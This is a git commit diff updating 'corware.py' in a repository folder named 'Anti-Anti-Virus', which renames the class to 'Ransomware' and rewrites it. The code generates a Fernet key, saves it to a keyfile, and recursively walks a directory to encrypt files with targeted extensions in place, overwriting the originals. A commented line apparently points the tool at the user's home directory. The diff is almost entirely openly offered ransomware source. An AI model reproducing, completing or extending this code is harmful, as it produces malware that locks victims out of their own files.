d52510e98ac9147a31aebec35e49c634b083f7f9
parad0x <56782193+parad0xxxx@users.noreply.github.com>
2020-03-17 03:44:16 +1100

    Update corware.py

--- Anti-Anti-Virus/Corware/corware.py
+++ Anti-Anti-Virus/Corware/corware.py
@@ -5,50 +5,103 @@
 import os
 from os.path import expanduser
 from cryptography.fernet import Fernet
+import base64
 
-class Coreware: # our initial class
+class Ransomware:
 
-	def __init__(self): # initialises our Coreware class
-		self.key = None
-		self.Cryptor = None
-		self.file_ext_targets = ['.txt'] # input file ext. format for the encryptor to detect
+    def __init__(self, key=None):
+        """
+        Initializes an instance of the Ransomware class.
+        
+        Args:
+            key: 128-bit AES key used to encrypt or decrypt files
+        
+        Attributes:
+            cryptor:fernet.Fernet: Object with encrypt and decrypt methods, set when key is generated if key is not passed 
+            file_ext_targets:list<str>: List of strings of allowed file extensions for encryption
+        """
 
-	def get_key(self): # generates AES decryption key // sets self.cryptor with a Fernet object
-		self.key = Fernet.generate_key()
-		self.cryptor = Fernet(self.key)
+        self.key = key
+        self.cryptor = None
+        self.file_ext_targets = ['txt']
 
-	def read_key(self, keyfile_name): # reads key from file
-		self.key = f.read()
-		self.cryptor = Fernet(self.key)
 
-	def write_key(self, keyfile_name): # writes the key to a keyfile
-		print(self.key)
-		with open(keyfile_name, 'wb') as f:
-			f.write(self.key)
+    def generate_key(self):
+        """
+        Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
+        """
 
-	def en_decrypt(self, root_dir, encrypted=False):
-		for root, _, files in os.walk(root_dir):
-			for f in files:
-				abs_file_path = os.path.join(root, f)
+        self.key = Fernet.generate_key()
+        self.cryptor = Fernet(self.key)
 
-				# if not a file ext. then pass
-				if not abs_file_path.split('.')[-1] in self.file_ext_targets:
-					continue
+    
+    def read_key(self, keyfile_name):
+        """
+        Reads in a key from a file.
 
-				self.crypt_file(abs_file_path, encrypted=encrypted)
+        Args:
+            keyfile_name:str: Path to the file containing the key
+        """
 
-	def en_decrypt_file(self, file_path, encrypted=False):
-		with open(file_path, 'rb+') as f:
-			_data = f.read()
-			if not encrypted:
-				print(f"Files (before encryption): {data}")
-				data = self.cryptor.decrypt(_data)
-				print(f"Files (after encryption): {data}")
-			else:
-				data = self.cryptor.decrypt(_data)
-				print(f"Files (after decryption): {data}")
-			f.seek(0)
-			f.write(data)
+        with open(keyfile_name, 'rb') as f:
+            self.key = f.read()
+            self.cryptor = Fernet(self.key)
+
+
+    def write_key(self, keyfile_name):
+        """
+        Writes the key to a keyfile
+        """
+
+        print(self.key)
+        with open(keyfile_name, 'wb') as f:
+            f.write(self.key)
+    
+
+    def crypt_root(self, root_dir, encrypted=False):
+        """
+        Recursively encrypts or decrypts files from root directory with allowed file extensions
+
+        Args:
+            root_dir:str: Absolute path of top level directory
+            encrypt:bool: Specify whether to encrypt or decrypt encountered files
+        """
+
+        for root, _, files in os.walk(root_dir):
+            for f in files:
+                abs_file_path = os.path.join(root, f)
+
+
+                # if not a file extension target, pass
+                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
+                    continue
+
+                self.crypt_file(abs_file_path, encrypted=encrypted)
+
+
+
+    def crypt_file(self, file_path, encrypted=False):
+        """
+        Encrypts or decrypts a file
+
+        Args:
+            file_path:str: Absolute path to a file 
+        """
+
+        with open(file_path, 'rb+') as f:
+            _data = f.read()
+
+            if not encrypted:
+                print(f'File contents pre encryption: {_data}')
+                data = self.cryptor.encrypt(_data)
+                print(f'File contents post encryption: {data}')
+            else:
+                data = self.cryptor.decrypt(_data)
+                print(f'File content post decryption: {data}')
+
+            f.seek(0)
+            f.write(data)
+
 
 if __name__ == '__main__':
     # sys_root = expanduser('~')
